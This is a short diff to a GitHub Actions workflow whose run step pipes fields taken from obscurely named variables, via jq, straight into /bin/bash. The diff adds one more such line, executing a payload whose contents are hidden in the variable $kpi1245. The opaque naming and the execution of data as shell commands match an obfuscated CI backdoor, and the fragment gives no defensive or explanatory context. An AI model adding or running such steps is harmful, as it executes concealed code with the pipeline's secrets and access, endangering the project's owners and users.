@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$kpz3" | jq -r .u3157 | /bin/bash
           echo $ai2494 | jq -r .kv15102 | /bin/bash
+          printf '%s' "$kpi1245" | jq -r .jcnwx3218 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
